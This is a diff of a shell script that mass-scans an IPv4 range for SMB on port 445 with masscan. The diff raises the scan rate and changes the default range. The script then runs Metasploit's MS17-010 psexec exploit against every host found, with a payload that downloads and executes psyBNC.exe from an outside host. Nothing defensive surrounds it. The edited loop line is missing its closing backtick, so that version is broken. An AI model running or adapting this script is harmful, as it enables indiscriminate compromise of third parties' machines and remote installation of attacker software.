@@ -16,13 +16,13 @@ make -j8 && sudo make install;
 cd ..;
 echo Installation step is done, now starting smb scanner...;
 sleep 5s;
-read -p 'IP Range to exploit? [ 1.0.0.0-1.255.255.255 ]' ip;
+read -p 'IP Range to exploit? [ 185.0.0.0-185.255.255.255 ]' ip;
 case $ip in
-	Y) sudo masscan -p 445 --range $ip --rate 10000  --open --banners -oG smb.scan&
+	Y) sudo masscan -p 445 --range $ip --rate 1000000  --open --banners -oG smb.scan&
 esac
 sleep 1s;
 echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
 sleep 1m;
 echo Starting attack on IPv4 range $1 ... This will take a while.;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
 echo !!!THE END OF THE WORLD!!!;
